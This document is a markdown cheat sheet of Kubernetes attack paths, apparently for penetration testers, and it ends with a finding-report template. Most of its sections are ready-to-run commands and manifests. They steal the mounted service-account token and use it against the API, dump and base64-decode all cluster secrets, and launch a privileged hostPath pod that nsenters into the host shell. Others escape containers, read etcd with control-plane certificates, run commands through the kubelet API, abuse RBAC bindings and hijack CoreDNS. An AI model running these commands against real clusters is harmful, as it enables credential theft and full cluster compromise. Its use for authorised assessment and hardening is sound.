# Kubernetes Attack Paths

## Enumerate

```bash
kubectl version
kubectl auth can-i --list                      # what THIS identity can do
kubectl get secrets -A -o json | jq -r '.items[] | .metadata.namespace + "/" + .metadata.name'
kubectl get clusterroles,clusterrolebindings -o wide
kubectl get pods -A -o wide
kubectl get svc -A
kubectl get crd | grep -iE 'cluster|tenant|admin'
kubectl get sa -A
```

`kubectl auth can-i --list` is the fastest answer to "what can I do here". Use it first.

## The core paths

### 1. Service account token → API

Every pod has a token at `/var/run/secrets/kubernetes.io/serviceaccount/token`.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s -k --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces
```

From a container with the token mounted, this is instant cluster access.

### 2. Secrets → credentials

```bash
kubectl get secrets -A -o json \
 | jq -r '.items[] | .data | to_entries[] | "\(.key)=\(.value|@base64d)"' | grep -iE 'pass|key|token|secret|conn'
```

Common juicy keys: `dockerconfigjson` (registry creds), `aws-secret-access-key`, `password`, `tls.crt`.

### 3. RBAC abuse

| Binding | Abuse |
|---|---|
| `cluster-admin` | full control |
| `create pods` + `list secrets` | mount any secret into a new pod |
| `create pods` | read the node filesystem via a hostPath pod |
| `escalate` / `bind` | bind yourself to a cluster-admin role |
| `impersonate` | impersonate any user/SA |
| `create token` (SA) | mint a token for a powerful SA |
| `get pods/exec` | exec into any pod |
| `nodes/proxy` | reach the kubelet API and exec on the host |
| `create token` + SA with powerful binding | privilege escalation |

### 4. Pod → host escape

```yaml
apiVersion: v1
kind: Pod
metadata: {name: pwn, namespace: default}
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    command: ["sh","-c","nsenter -t 1 -m -u -i -n -p -- /bin/sh"]
    volumeMounts:
    - {name: root, mountPath: /host}
  volumes:
  - name: root
    hostPath: {path: /}
```

Simpler with `kubectl debug node/<node> -it --image=alpine -- chroot /host`.

Other escape vectors: privileged: true, `CAP_SYS_ADMIN`, hostPath mounts of `/`, `/proc`, `/etc`,
docker.sock mounted, `/dev/kmsg`.

### 5. Container escape from inside a pod

```bash
cat /proc/1/cgroup | grep -E 'docker|kubepods'
ls -la /var/run/docker.sock
cat /proc/self/status | grep CapEff
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')
cat /proc/1/root/etc/hostname      # host filesystem
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

### 6. etcd

```bash
etcdctl --endpoints=https://<ip>:2379 endpoint status \
  --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --cert /etc/kubernetes/pki/etcd/server.crt \
  --key /etc/kubernetes/pki/etcd/server.key
etcdctl get / --prefix --keys-only
```

etcd holds every secret in the cluster. Access to the etcd certs = full cluster compromise.

### 7. Kubelet

The kubelet API on `:10250` (read-only 10255) exposes pod execution.

```bash
curl -sk https://<node>:10250/pods | jq '.items[].metadata.name'
curl -sk "https://<node>:10250/run/<ns>/<pod>/<container>" -d 'cmd=id'
```

### 8. Cluster add-ons

| Target | Value |
|---|---|
| `kube-system/kube-proxy` | node compromise |
| `kube-system/coredns` | DNS hijack → traffic interception |
| `kube-system/metrics-server` | permissions |
| `cluster-autoscaler` | node listing |
| `aws-cloud-controller` | cloud API via IRSA |
| `vpa` | scaling abuse |

A DNS hijack through CoreDNS is a classic path: modify the ConfigMap, and every pod's DNS resolves
through you.

### 9. EKS / GKE / AKS specifics

| Platform | Extra path |
|---|---|
| EKS | the `aws-auth` ConfigMap maps IAM roles to RBAC → a broad IAM role becomes cluster-admin |
| GKE | Workload Identity binding; `gcloud container clusters get-credentials` |
| AKS | Entra ID integration, `az aks get-credentials`, managed identity in the node pool |
| OpenShift | SCCs constrain pods; `oc` differs from `kubectl` |

## Cloud-native ingress and exposure

```bash
kubectl get ingress -A
kubectl get svc -A | grep -E 'LoadBalancer|NodePort'
```

- NodePort exposed → direct pod access.
- LoadBalancer with a public IP → the service is internet-facing.
- Ingress with a misconfigured annotation → TLS secret leakage.
- A public etcd (2379) or kubelet (10250) → check from outside.

## Kubernetes-specific misconfigurations

- `privileged: true` pods
- hostPath volumes of `/`, `/var/run/docker.sock`, `/proc`, `/etc`
- `allowPrivilegeEscalation: true` with `runAsNonRoot: false`
- `readOnlyRootFilesystem: false` on sensitive workloads
- ServiceAccounts with `automountServiceAccountToken: true` that do not need the API
- Missing `resourceLimits` → noisy-neighbour and eviction issues
- `imagePullPolicy: Always` on a mutable tag
- ClusterRoles bound to `system:authenticated` → every logged-in user

## Reporting a Kubernetes finding

```
NAMESPACE: <ns>
IDENTITY:  <SA / user>
PERMISSION:<the RBAC binding>
PATH:      <token -> secret -> ...>
PROOF:     <kubectl/curl command + result>
BLAST:     <one pod / namespace / whole cluster>
```
